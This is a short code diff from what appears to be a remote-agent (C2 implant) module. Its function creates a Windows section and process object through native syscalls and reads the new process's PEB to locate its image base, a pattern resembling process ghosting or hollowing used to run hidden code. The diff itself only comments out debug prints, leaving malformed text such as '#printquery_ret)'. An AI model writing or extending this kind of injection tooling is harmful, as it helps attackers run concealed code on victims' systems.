@@ -38,7 +38,7 @@ def function(agent_id, args):
     
     if section_ret["retval"] != 0:
         return {"Result": f"Failed to create section: {hex(section_ret['retval'])}"}
-    print(f"Section handle {section_ret["section_handle"]}")
+    #printf"Section handle {section_ret["section_handle"]}")
     h_section = section_ret["section_handle"]
 
     # 3. CREATE PROCESS OBJECT
@@ -60,8 +60,8 @@ def function(agent_id, args):
         # For simplicity in this native chain, we assume the agent's push_syscall handles 
         # the internal Query + Thread start if not specified, 
         # OR we manually call NtCreateThreadEx.
-        print(query_ret)
-        print(entrypoint_ret)
+        #printquery_ret)
+        #printentrypoint_ret)
         peb_ret = NtReadVirtualMemory(agent_id, [h_process, query_ret["peb_base"]+0x10, 8])
         if peb_ret["retval"] == 0:
             imagebase = int.from_bytes(peb_ret["data"], byteorder='little')
